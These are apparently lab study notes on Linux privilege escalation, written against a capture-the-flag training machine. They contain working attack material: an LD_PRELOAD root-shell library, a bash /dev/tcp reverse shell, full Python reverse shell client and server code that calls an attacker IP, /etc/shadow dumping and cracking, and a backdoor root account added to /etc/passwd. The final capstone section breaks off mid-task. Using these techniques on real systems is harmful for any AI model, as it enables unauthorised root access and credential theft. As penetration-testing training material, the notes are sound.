# Linux Privilege Escalation

### **What is Privilege Escalation?** <a href="#id-7h01q99ixdwq" id="id-7h01q99ixdwq"></a>

* Going from a lower permission account to a higher permission one.
* Exploitation of a vulnerability, design flaw, or configuration oversight in an OS or application to gain unauthorised access to resources that are usually restricted from the users.

### **Why is it important?** <a href="#b9smfc3show" id="b9smfc3show"></a>

* Rare to be able to gain a foothold (initial access) that gives direct administrative access.
* Gaining system administrator levels of access allows additional actions to be performed.
* Resetting passwords.
* Bypassing access controls to compromise protected data.
* Editing software configurations.
* Enabling persistence.
* Changing the privilege of existing (or new) users.
* Execute any administrative command.

### **Enumeration** <a href="#soo7m071u37b" id="soo7m071u37b"></a>

* First step to take once access is gained to any system.
  * May have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account.
* Enumeration is as important during the post-compromise phase as it is before.

### **hostname** <a href="#id-37a1x2mtzcjx" id="id-37a1x2mtzcjx"></a>

* hostname command return the hostname of the target machine.
* Can provide information about the target system’s role within the corporate network.
  * SQL-PROD-01 for a production SQL server.

### **uname -a** <a href="#id-3o91d8nnln2g" id="id-3o91d8nnln2g"></a>

* Prints system information giving additional detail about the kernel used by the system.
* Useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### **/proc/version** <a href="#id-4wqy4z4p2wd2" id="id-4wqy4z4p2wd2"></a>

* Proc filesystem (procfs) provides information about the target system processes.
* Essential Linux tool to have in the arsenal.
* cat /proc/version may give information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

### **/etc/issue** <a href="#t0h1cmbfa921" id="t0h1cmbfa921"></a>

* Systems can be identified by reading the /etc/issue file using cat.
* Usually contains some information about the OS.

### **ps** <a href="#id-5qslv7zhjfly" id="id-5qslv7zhjfly"></a>

* Effective way to see the running processes on a Linux system.
* Shows processes for the current shell.
* Output of the ps (Process Status).
  * PID: The process ID (unique to the process).
  * TTY: Terminal type used by the user.
  * Time: Amount of CPU time used by the process (this is NOT the time this process has been running for).
  * CMD: The command or executable running (will NOT display any command line parameter).
* Provides a few useful options.
  * ps -A: View all running processes.
  * ps axjf: View process tree.

#### **ps aux** <a href="#tnupy78zcmd8" id="tnupy78zcmd8"></a>

* Shows processes for all users (a).
* Displays the user that launched the process (u).
* Shows processes that are not attached to a terminal (x).
* Output gives a better understanding of the system and potential vulnerabilities.

### **env** <a href="#t11wovfv7m1u" id="t11wovfv7m1u"></a>

* Shows environmental variables.
* PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

### **sudo -l** <a href="#id-5f8dyjg8itn" id="id-5f8dyjg8itn"></a>

* The target system may be configured to allow users to run some (or all) commands with root privileges.
* Used to list all commands the current user can run using sudo.

### **ls** <a href="#jsrxytgdannb" id="jsrxytgdannb"></a>

* Always use ls -la while looking for potential privilege escalation vectors.

### **Id** <a href="#e4jscmpgx5hs" id="e4jscmpgx5hs"></a>

* Provides a general overview of the user’s privilege level and group memberships.
* Can be used to obtain the same information for another user.

### **/etc/passwd** <a href="#m20043712br3" id="m20043712br3"></a>

* Reading the /etc/passwd file with 'cat' can be an easy way to discover users on the system.
* Output can be easily cut and converted to a useful list for brute-force attacks.

cat /etc/passwd | cut -d ":" -f 1

* Grep for 'home' as real users will most likely have their folders under this directory.

cat /etc/passwd | grep home

### **history** <a href="#sstp6y8ltasr" id="sstp6y8ltasr"></a>

* Looking at earlier commands with the history command can give some idea about the target system.
* Rarely has stored information such as passwords or usernames.

### **ifconfig** <a href="#u12k8kymy1nr" id="u12k8kymy1nr"></a>

* Gives information about the network interfaces of the system.
* Target system may be a pivoting point to another network.
  * Target may have three interfaces (eth0, tun0, and tun1).
  * Attacker can reach the eth0 interface but can not directly access the two other networks.
  * Confirm using ip route command to see which network routes exist.

### **netstat** <a href="#id-6e1f7lf0ed5s" id="id-6e1f7lf0ed5s"></a>

* Worth looking into existing communications.
* Used with several different options to gather information on existing connections.
  * netstat -a: shows all listening ports and established connections.
  * netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
  * netstat -l: list ports in 'listening' mode.
    * These ports are open and ready to accept incoming connections.
    * Use with t option to list only ports that are listening using the TCP protocol.
  * netstat -s: list network usage statistics by protocol.
    * Use with -t or -u options to limit the output to a specific protocol.
  * netstat -tp: list connections with the service name and PID information.
    * Use with -l to list listening ports.
    * PID/Program name column will be empty if the process is owned by another user.
  * netstat -i: Shows interface statistics.
* netstat -ano usage is seen most often.
  * \-a: Display all sockets
  * \-n: Do not resolve names
  * \-o: Display timers

### **find** <a href="#a53w49ssbjr4" id="a53w49ssbjr4"></a>

* Searching the target system for important information and potential privilege escalation vectors can be fruitful.

| **Find Parameters**         | **Purpose**                                                                                                                                     |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| find . -name flag1.txt      | Find the file named flag1.txt in the current directory.                                                                                         |
| find /home -name flag1.txt  | Find the file names flag1.txt in the /home directory.                                                                                           |
| find / -type d -name config | Find the directory named config under /.                                                                                                        |
| find / -type f -perm 0777   | Find files with the 777 permissions (files readable, writable, and executable by all users).                                                    |
| find / -perm a=x            | Find executable files.                                                                                                                          |
| find /home -user frank      | Find all files for user frank under /home.                                                                                                      |
| find / -mtime 10            | Find files that were modified in the last 10 days.                                                                                              |
| find / -atime 10            | Find files that were accessed in the last 10 day.                                                                                               |
| find / -cmin -60            | Find files changed within the last hour (60 minutes).                                                                                           |
| find / -amin -60            | Find files accessed within the last hour (60 minutes).                                                                                          |
| find / -size 50M            | Find files with a 50 MB size. This command can also be used with + and - signs to specify a file that is larger or smaller than the given size. |

* Use find -type f 2>/dev/null to redirect errors to /dev/null and have a cleaner output.
* Folders and files that can be written to or executed from.

find / -writable -type d 2>/dev/null : Find world-writeable folders. find / -perm -222 -type d 2>/dev/null : Find world-writeable folders. find / -perm -o w -type d 2>/dev/null : Find world-writeable folders.

* perm parameter affects how find works.\

  * find / -perm -o x -type d 2>/dev/null finds world-executable folders.
* Find development tools and supported languages.\

  * find / -name perl\*
  * find / -name python\*
  * find / -name gcc\*
* SUID bit allows the file to run with the privilege level of the account that owns it rather than the account which runs it.\

  * Allows for an interesting privilege escalation path.

find / -perm -u=s -type f 2>/dev/null

### **Automated Enumeration Tools** <a href="#hgjuyoq9ht7j" id="hgjuyoq9ht7j"></a>

* Tools should only be used to save time knowing they may miss some privilege escalation vectors.
* Target system’s environment will influence the tool to use.
  * E.g. cannot run a tool written in Python if it is not installed on the target system.
* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
* [LinEnum](https://github.com/rebootuser/LinEnum).
* [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester).
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker).

### **Privilege Escalation: Kernel Exploits** <a href="#z9zkqmp5mz9d" id="z9zkqmp5mz9d"></a>

* Privilege escalation ideally leads to root privileges.
  * May be achieved by exploiting an existing vulnerability or by accessing another user account that has more privileges, information, or access.
* Privilege escalation process will rely on misconfigurations and lax permissions unless a single vulnerability leads to a root shell.
* Linux kernel manages communication between components such as the memory on the system and applications.
  * Requires the kernel to have specific privileges.
  * Successful exploit will potentially lead to root privileges.
* Kernel exploit methodology is simple.

1. Identify the kernel version.
2. Search and find an exploit code for the kernel version of the target system.
3. Run the exploit.

* Failed kernel exploits can lead to a system crash.
  * Ensure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit.

### **Research sources** <a href="#id-1b5r7mc0u0ol" id="id-1b5r7mc0u0ol"></a>

* Use Google to search for existing exploit code based on enumeration findings.
* [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can be useful.
* Use a script like LES (Linux Exploit Suggester).
  * Can generate false positives (report a kernel vulnerability that does not affect the target system).
  * Can generate false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

### **Hints/Notes** <a href="#expj74jdkyot" id="expj74jdkyot"></a>

* Be specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
* Understand how the exploit code works BEFORE launching it.
* Some exploit codes can make changes on the OS that would make them insecure in further use or make irreversible changes to the system.
  * This creates problems later.
  * Absolute no-nos during a real penetration testing engagement.
* Some exploits may require further interaction once they are run.
* Read all comments and instructions provided with the exploit code.
* Transfer exploit code from the attacking machine to the target system using the SimpleHTTPServer Python module and wget respectively.

### **Kernel exploit Methodology** <a href="#id-9rr2eo74ezji" id="id-9rr2eo74ezji"></a>

1. Identify the kernel version.

uname -a

1. Find an exploit code for the kernel version of the target system.

* Use[ Exploit Database](https://www.exploit-db.com/) to search for an exploit code.

1. Download the exploit to the attacking machine.
2. Serve the exploit code to the target using SimpleHTTPServer Python module.

python3 -m http.server 9000

1. Use wget on target machine to copy the code across.

wget http://10.10.166.35:9000/37392.c -P /tmp/

* \-P option specifies that the file should be saved to the /tmp/ directory on the target.
  * Specify the path as /tmp/ to avoid the permission error while running wget as a low-level privilege user (karen).

1. Run the exploit file to perform privilege escalation.

Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.

* Rename the exploit file.

ofc.c: mv ./37392.c ofc.c

* Compile C source code file into a binary executable file.

gcc ofs.c -o ofs

* gcc is the GNU Compiler Collection.
  * Commonly used compiler for the C programming language on Linux.
* ofs.c file contains the C source code that will be compiled into the executable file.
* \-o option specifies the output file name, which in this case is ofs.
* Type ./ofs to run the compiled executable file.

1. Verify that root privilege has been gained.

\# id

uid=0(root) gid=0(root) groups=0(root),1001(karen)

### **Privilege Escalation: Sudo** <a href="#id-5749otnmms6e" id="id-5749otnmms6e"></a>

* System administrators may need to give regular users some flexibility on their privileges.
* Check current root privileges using sudo -l command.
* [GTFOBins](https://gtfobins.github.io/) provides information on how a user with sudo rights on a program can abuse it.
  * E.g. user has sudo rights on nmap command.
    * Interactive mode available on versions 2.02 to 5.21 can be used to spawn a root shell.
    * sudo nmap --interactive.
  * E.g. user has sudo rights on find command.
    * find . -exec /bin/sh \\; -quit may be able to break out from restricted environments by spawning an interactive system shell.

### **Leverage application functions** <a href="#gcnjz61xt8hb" id="gcnjz61xt8hb"></a>

* Some applications will not have a known exploit.
* E.g. Apache2 server.
  * Can use a 'hack' to leak information leveraging a function of the application.
  * Apache2 has an option that supports loading alternative configuration files.
  * \-f : specify an alternate ServerConfigFile.
  * Loading the /etc/shadow file using -f option will result in an error message that includes the first line of the /etc/shadow file.

### **Leverage LD\_PRELOAD** <a href="#vs5pst9vbkci" id="vs5pst9vbkci"></a>

* LD\_PRELOAD environment option is a function that allows any program to use shared libraries.
* This[ blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld\_preload-to-cheat-inject-features-and-investigate-programs/) describes the capabilities of LD\_PRELOAD.
* A shared library can be generated that will be loaded and executed before the program is run if the env\_keep option is enabled.
* LD\_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
* Privilege escalation vector.

1. Check for LD\_PRELOAD (with the env\_keep option).
2. Write a simple C code compiled as a share object (.so extension) file.
   * C code will simply spawn a root shell.
   * Save code as shell.c.

\#include \<stdio.h>

\#include \<sys/types.h>

\#include \<stdlib.h>

void \_init() {

unsetenv("LD\_PRELOAD");

setgid(0);

setuid(0);

system("/bin/bash");

}

1. Compile it using gcc (GNU Compiler Collection) into a shared object file.

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

1. Run the program with sudo rights and the LD\_PRELOAD option pointing to the .so file.
   * Apache2, find, or almost any of the programs that can be run with sudo can be used.

sudo LD\_PRELOAD=/home/user/ldpreload/shell.so find

1. This will result in a shell spawn with root privileges.

### **Privilege Escalation: SUID** <a href="#sxncjttl0c6e" id="sxncjttl0c6e"></a>

* Linux files can have read, write, and execute permissions.
  * Given to users within their privilege levels.
  * SUID (Set-user Identification) allow files to be executed with permission level of the file owner.
  * SGID (Set-group Identification) allow files to be executed with permission level of the group owner.
    * s bit set showing file's special permission level.
* find / -type f -perm -04000 -ls 2>/dev/null lists files that have SUID or SGID bits set.
  * Compare executables on this list with[ GTFOBins](https://gtfobins.github.io/).
  * Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set.
  * Use[ this link](https://gtfobins.github.io/#+suid) for pre-filtered list.
    * List shows that base64 has the SUID bit set.

1722 44 -rwsr-xr-x 1 root root 43352 Sep 5 2019 /usr/bin/base64

SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

LFILE=file\_to\_read

./base64 "$LFILE" | base64 --decode

* base64 SUID bit set does not drop the elevated privileges and may be abused to access the file system.
  * base64 is owned by root.
  * Reading and editing of files at a higher privilege level than the current user is possible.
* Two basic options for privilege escalation.
  * Reading the /etc/shadow file.
  * Adding the user to /etc/passwd.

### **Read /etc/shadow file** <a href="#plc69bs1nevp" id="plc69bs1nevp"></a>

* find / -type f -perm -04000 -ls 2>/dev/null.
  * /usr/bin/base64 has SUID bit set.

$ LFILE=/etc/shadow

$ /usr/bin/base64 "$LFILE1" | base64 --decode | grep user2

* Prints contents of the /etc/shadow file.

user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::

* Create empty files in SUID folder.

touch ./Desktop/SUID/passwd.txt ./Desktop/SUID/shadow.txt ./Desktop/SUID/passwords.txt

* Copy user2 data from /etc/passwd' into passwd.txt\` file.
* Copy user2 data from /etc/shadow' into shadow.txt\` file.
* unshadow tool creates a file crackable by John the Ripper.

unshadow ./Desktop/SUID/passwd.txt ./Desktop/SUID/shadow.txt > ./Desktop/SUID/passwords.txt

* John the Ripper can return one or several passwords in cleartext with the correct wordlist and a little luck.

john --wordlist=/usr/share/wordlists/rockyou.txt ./Desktop/SUID/passwords.txt

Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"

Use the "--format=HMAC-SHA256" option to force loading these as that type instead

Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"

Use the "--format=sha512crypt-opencl" option to force loading these as that type instead

Using default input encoding: UTF-8

Loaded 1 password hash (sha512crypt, crypt(3) $6$ \[SHA512 256/256 AVX2 4x])

Cost 1 (iteration count) is 5000 for all loaded hashes

Will run 2 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

Password1 (user2)

1g 0:00:00:06 DONE (2024-02-12 18:39) 0.1526g/s 547.1p/s 547.1c/s 547.1C/s asdf1234..fresa

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

* Another option would be to add a new user that has root privileges if the SUID bit was set for a text editor.
  * This would help circumvent the tedious process of password cracking.
  * Need the hash value of the password the new user should have.
    * This can be done quickly using openssl.

openssl passwd -1 -salt THM password1

$1$THM$WnbwlliCqxFRQepUTCkUT1

* Add the password with a username to the /etc/passwd file.

hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash

* Switch to the new user and hopefully gain root privileges.

### **Privilege Escalation: Capabilities** <a href="#id-1cm77son33wh" id="id-1cm77son33wh"></a>

* "Capabilities" are another method system admins can use to increase the privilege level of a process or binary.
  * Manage privileged at a more granular level.
  * Change the capabilities of an individual binary.
* getcap tool lists enabled capabilities.
  * Generates huge amount of errors when run as unprivileged user.
    * Redirect error messages to dev/null.

getcap -r / 2>/dev/null

* Output lists

/usr/lib/x86\_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap\_net\_bind\_service,cap\_net\_admin+ep

/usr/bin/traceroute6.iputils = cap\_net\_raw+ep

/usr/bin/mtr-packet = cap\_net\_raw+ep

/usr/bin/ping = cap\_net\_raw+ep

/home/karen/vim = cap\_setuid+ep

/home/ubuntu/view = cap\_setuid+ep

* [GTFObins](https://gtfobins.github.io/#+capabilities) has good list of binaries if any capabilities are set.

### **Capabilities** <a href="#id-7xfco5thtoiz" id="id-7xfco5thtoiz"></a>

If the binary has the Linux CAP\_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. This requires that vim is compiled with Python support. Prepend :py3 for Python 3. cp $(which vim) . sudo setcap cap\_setuid+ep vim ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

* vim does not have the SUID bit set.
  * Capability attack vector is not discoverable when looking for SUID.

ls -l /usr/bin/vim

lrwxrwxrwx 1 root root 21 Oct 26 2020 /usr/bin/vim -> /etc/alternatives/vim

ls -l /home/karen/vim

\-rwxr-xr-x 1 root root 2906824 Jun 18 2021 /home/karen/vim

* Leverage GTFObins command.

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

* Root shell is launched.

\# id

uid=0(root) gid=1001(karen) groups=1001(karen)

### **Privilege Escalation: Cron Jobs** <a href="#gq2194uk2bdt" id="gq2194uk2bdt"></a>

* Cron jobs are used to run scripts or binaries at specific times.
* Run with the privilege of their owner by default.
* If a scheduled task that runs with root privileges can be changed (ideally to a shell) then this is a privilege escalation vector.
* Configurations stored as crontabs (cron tables).
  * Determines next time and date task will run.
* Every user has their own crontab file.
* Any user can read a system-wide cron jobs file.

cat /etc/crontab

\# /etc/crontab: system-wide crontab

\# Unlike any other crontab you don't have to run the \`crontab'

\# command to install the new version when you edit this file

\# and files in /etc/cron.d. These files also have username fields,

\# that none of the other crontabs do.

SHELL=/bin/sh

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

\# Example of job definition:

\# .---------------- minute (0 - 59)

\# | .------------- hour (0 - 23)

\# | | .---------- day of month (1 - 31)

\# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...

\# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat

\# | | | | |

\# \* \* \* \* \* user-name command to be executed

17 \* \* \* \* root cd / && run-parts --report /etc/cron.hourly

25 6 \* \* \* root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )

47 6 \* \* 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )

52 6 1 \* \* root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

\#

\* \* \* \* \* root /antivirus.sh

\* \* \* \* \* root antivirus.sh

\* \* \* \* \* root /home/karen/backup.sh

\* \* \* \* \* root /tmp/test.py

* All scripts configured to run every minute.
* Contents of /home/karen/backup.sh.

cat /home/karen/backup.sh

\#!/bin/bash

cd /home/admin/1/2/3/Results

zip -r /home/admin/download.zip ./\*

* Modify accessible script to create a reverse shell.
* nc will most likely not support -e option due to security.
* Always prefer to start reverse shells.
  * Do not want to compromise system integrity.
* Create Reverse shell script.

1. nano /home/karen/backup/sh
2. Delete bottom two lines.
3. Add bash -i >& /dev/tcp/10.10.16.10/6666 0>&1
   * IP address is that of the attacker.
4. CTRL+X to save and exit.

* Ensure that the script is executable.

chmod +x /home/karen/backup.sh

* Run listener on attacking machine to receive incoming connection.

nc -nlvp 6666

Listening on \[0.0.0.0] (family 0, port 6666)

Connection from 10.10.43.228 40628 received!

bash: cannot set terminal process group (12806): Inappropriate ioctl for device

bash: no job control in this shell

root@ip-10-10-43-228:\~#

root@ip-10-10-43-228:\~# id

id

uid=0(root) gid=0(root) groups=0(root)

root@ip-10-10-43-228:\~# whoami

whoami

root

root@ip-10-10-43-228:\~#

* Crontab can sometimes lead to easy priviledge escalation vectors.

1. System admin needs to run script at regular intervals.
2. Creates a cron job to do this.
3. Script becomes obsolete and is deleted.
4. Cron job is not cleaned up.
   * Change management failure results in potential exploit.
   * test.py has been deleted but cron job still exists.

find /tmp -name test.py

* Cron refers to paths listed under PATH variable in /etc/crontab file if full script is not defined.
* Create script named test1.py in /tmp folder to be run by the cron job.

1. nano /tmp/test1.py
2. Enter reverse shell client code from[ PYTHON REVERSE SHELL](https://medium.com/@rietesh/python-reverse-shell-hack-your-neighbours-552561336ca8).

import socket

import os

import subprocess

\# set target IP and port

target\_host = "10.10.234.130"

target\_port = 6666

\# create client TCP socket

\# connect socket to target IP and port

client = socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)

client.connect((target\_host,target\_port))

\# receive command in data object and decode back to string

\# check if command is cd and use os.chdir to change directory

\# directly open a process for other commands and give the decoded string

\# pipe out stdout, stdin, and stderr

\# bytes piped into output\_bytes, converted into string and sent across connection

\# connection closed when while loop breaks

while True:

data = client.recv(1024)

if data\[:2].decode("utf-8") == 'cd':

os.chdir(data\[3:].decode("utf-8"))

if len(data) > 0:

cmd = subprocess.Popen(data\[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

output\_bytes = cmd.stdout.read()

output\_str = str(output\_bytes, "utf-8")

client.send(str.encode(output\_str + str(os.getcwd()) + '$'))

\#print(output\_str)

client.close()

1. CTRL+X to save and exit.

* Create test.py cron job file to run reverse shell.

1. nano /tmp/test1.py.
2. Add code to execute test.py\`.

python3 /tmp/test1.py

1. Make files executable.

chmod +x /tmp/test.py /tmp/test1.py

1. Create listener on attacking machine to catch connection.
   * Enter reverse shell server code from[ PYTHON REVERSE SHELL](https://medium.com/@rietesh/python-reverse-shell-hack-your-neighbours-552561336ca8).
   * nano ./Desktop/Python\_Reverse\_Shell\_Server.py.

import socket

import threading

import os

\# define send\_commands function that accepts socket object

\# encode commands and send across connection (conn.send)

\# make received data readable by converting to UTF-8 string

\# add end="" to responses to avoid new line character and move cursor to end

def send\_commands(conn):

while True:

cmd = input()

if cmd == 'quit':

conn.close()

server.close()

sys.exit()

if len(str.encode(cmd)) > 0:

conn.send(str.encode(cmd))

client\_response = str(conn.recv(1024), "utf-8")

print(client\_response, end="")

\# set attacker's IP and port

bind\_ip = "10.10.234.130"

bind\_port = 6666

serv\_add = ((bind\_ip),(bind\_port))

\# create socket object and bind to server address

\# listen for connections every 5 seconds

server = socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)

print (serv\_add)

server.bind((serv\_add))

server.listen(5)

print ("\[\*] listening on {}:{}".format(bind\_ip,bind\_port))

\# accept successful connections

\# print out details and ask for commands to be executed

conn,addr = server.accept()

print('accepted connection from {} and port {}'.format(addr\[0],addr\[1]))

print("enter the commands below")

\# call send\_commands function

\# close connection if IF statement breaks

send\_commands(conn)

conn.close()

* Start Python listener on attacking machine.

python ./Desktop/python\_reverse\_shell\_server.py

('10.10.234.130', 6666)

\[\*] listening on 10.10.234.130:6666

* Run Python reverse shell code on target.

python3 /tmp/test.py

* Reverse shell caught by listener.
  * Cron job ran successfully as root.

accepted connection from 10.10.114.83 and port 33502

enter the commands below

whoami

root

/root$

### **Privilege Escalation: PATH** <a href="#iw19e8jn2h33" id="iw19e8jn2h33"></a>

* Can potentially hijack an application to run a script if a folder that the current user has write access to is located in the PATH.
* PATH is an environmental variable that tells the OS where to look for executables.
* Linux will search in folders defined in PATH for any command not built into the shell or not defined with an absolute path.

1. What folders are located under $PATH?

echo %PATH

1. Does the current user have write privileges for any of these folders?

find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

* Refine find to get rid of the many results related to running processes.

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

1. Can the current user modify $PATH?
   * Add /tmp folder to PATH.

export PATH=/tmp:$PATH

1. Is there a script or app that can be executed that will be affected by this vulnerability?

### **Challenge** <a href="#de1itenlekwe" id="de1itenlekwe"></a>

1. What folders are located under $PATH?

echo %PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

1. Does the current user have write privileges for any of these folders?

find / -writable 2>/dev/null | cut -d "/" -f 2 | grep -v proc | sort -u

dev

etc

home

run

snap

sys

tmp

usr

var

* Refine find to identify subfolders under home.

karen@ip-10-10-66-41:/home/murdoch$ find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | grep -v proc | sort -u

home/murdoch

1. Can the current user modify $PATH?
2. Is there a script or app that can be executed that will be affected by this vulnerability?\*

* User karen has write access to /home/murdoch/ folder.

ls -la /home/murdoch

total 32

drwxrwxrwx 2 root root 4096 Oct 22 2021 .

drwxr-xr-x 5 root root 4096 Jun 20 2021 ..

\-rwsr-xr-x 1 root root 16712 Jun 20 2021 test

\-rw-rw-r-- 1 root root 86 Jun 20 2021 thm.py

* "test" file has SUID bit set.
  * Allows file to be executed with permission level of the file owner - root.

find /home/murdoch -type f -perm -04000 -ls 2>/dev/null

256346 20 -rwsr-xr-x 1 root root 16712 Jun 20 2021 /home/murdoch/test

* Contents of thm.py script.

cat /home/murdoch/thm.py

/usr/bin/python3

import os

import sys

try:

os.system("thm")

except:

sys.exit()

* "test" file appears to be compiled version of thm.py script.

./test

sh: 1: thm: not found

* No path defined for script.
* Linux will look in the PATH environment to find the executable and will execute the first one it finds.
* Add /tmp directory into the beginning of the PATH environment.

export PATH=/tmp:$PATH

* Copy /bin/bash as "thm" under the /tmp folder.

cd /tmp

echo "/bin/bash" > thm

* Give executable rights to copy of /bin/bash

chmod 777 thm

ls -l thm

\-rwxrwxrwx 1 karen karen 10 Feb 13 14:17 thm

* home\murdoch\test file will run with root privileges as SUID bit set.

cd /home/murdoch

whoami

karen

id

uid=1001(karen) gid=1001(karen) groups=1001(karen)

./test

whoami

root

id

uid=0(root) gid=0(root) groups=0(root),1001(karen)

### **Privilege Escalation: NFS** <a href="#xgm0v8mc2oiq" id="xgm0v8mc2oiq"></a>

* Shared folders and remote management interfaces (SSH / Telnet) can help gain root access to a target.
  * E.g. finding root SSH private key.
* Misconfigured network shell may be another attack vector.
* Network File Sharing (NFS) located in \`/etc/exports/ file.
  * Created during NFS server install.

cat /etc/exports

\# /etc/exports: the access control list for filesystems which may be exported

\# to NFS clients. See exports(5).

\#

\# Example for NFSv2 and NFSv3:

\# /srv/homes hostname1(rw,sync,no\_subtree\_check) hostname2(ro,sync,no\_subtree\_check)

\#

\# Example for NFSv4:

\# /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no\_subtree\_check)

\# /srv/nfs4/homes gss/krb5i(rw,sync,no\_subtree\_check)

\#

/home/backup \*(rw,sync,insecure,no\_root\_squash,no\_subtree\_check)

/tmp \*(rw,sync,insecure,no\_root\_squash,no\_subtree\_check)

/home/ubuntu/sharedfolder \*(rw,sync,insecure,no\_root\_squash,no\_subtree\_check)

* no\_root\_squash option is critical element for privilege escalation.
* NSF changes root user to nsfnobody and strips any file from operation with root privileges by default.
* Can create executable with SUID bit set and run it on target if 1no\_root\_squash1 is preent on writable share.
* Enumerate mountable shares from attacking machine.

showmount -e 10.10.91.21

Export list for 10.10.91.21:

/home/ubuntu/sharedfolder \*

/tmp \*

/home/backup \*

* Mount one of the no\_root\_squash shares to the attacking machine.

mkdir /tmp/sharedfolder

mount -o rw 10.10.91.21:/home/ubuntu/sharedfolder /tmp/sharedfolder

* Create C executable to run /bin/bash on target.

1. nano nfs.c.

int main()

{

setgid(0);

setuid(0);

system("/bin/bash");

return 0;

}

1. CTRL+X to save and close.
2. Compile the code (must be run as sudo).

sudo gcc nfs.c -o nfs -w

sudo chmod +s nfs

ls -l nfs

\-rwsr-sr-x 1 root root 8392 Feb 13 14:46 nfs

* Copy files to target.

cp /root/nfs /root/nfs.c /tmp/sharedfolder

* Navigate to the \`/home/ubuntu/sharedfolder' from the target and execute the "nfs" file.

cd /home/ubuntu/sharedfolder

id

uid=1001(karen) gid=1001(karen) groups=1001(karen)

./nfs

id

uid=0(root) gid=0(root) groups=0(root),1001(karen)

* Root shell achieved.

### **Capstone Challenge** <a href="#id-4ybqa0j2vur5" id="id-4ybqa0j2vur5"></a>

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root. Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

* hostname : ip-10-10-91-89
* name -a : Linux ip-10-10-91-89 3.10.0-1160.el7.x86\_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86\_64 x86\_64 x86\_64 GNU/Linux
* cat /proc/version : Linux version 3.10.0-1160.el7.x86\_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020
* sudo -l : user leonard may not run sudo on ip-10-10-91-89.
* id : uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined\_u:unconfined\_r:unconfined\_t:s0-s0:c0.c1023

history

1 ls

2 cd ..

3 exit

4 ls

5 cd Ã§Ã§

6 cd ..

7 ls

8 cd home/

9 ls

10 cd missy/

11 su missy

12 ls

13 cd ..

14 ls

15 cd rootflag/

16 ls

17 cat flag2.txt

18 su root

19 ls

20 cd rootflag/

21 su missy

* No results using find to search for "flag".

find / -name flag 2>/dev/null

* No exploits for kernel 3.10.0-1160 found on[ Exploit Database](https://www.exploit-db.com/).
* find / -type f -perm -04000 -ls 2>/dev/null identified "base64" file with SUID (Set-user Identification) set.
  * "base64" file appears as SUID exploit on[ GTFOBins](https://gtfobins.github.io/#base64%20+suid).

16779966 40 -rwsr-xr-x 1 root root 37360 Aug 20 2019 /usr/bin/base64

* Used SUID exploit to read etc/shadow file.

LFILE=/etc/shadow

/usr/bin/base64 "$LFILE" | base64 --decode

* history output suggested that "missy" user may have access to "flag1.txt".

mkdir ./Desktop/Capstone

cd ./Desktop/Capstone

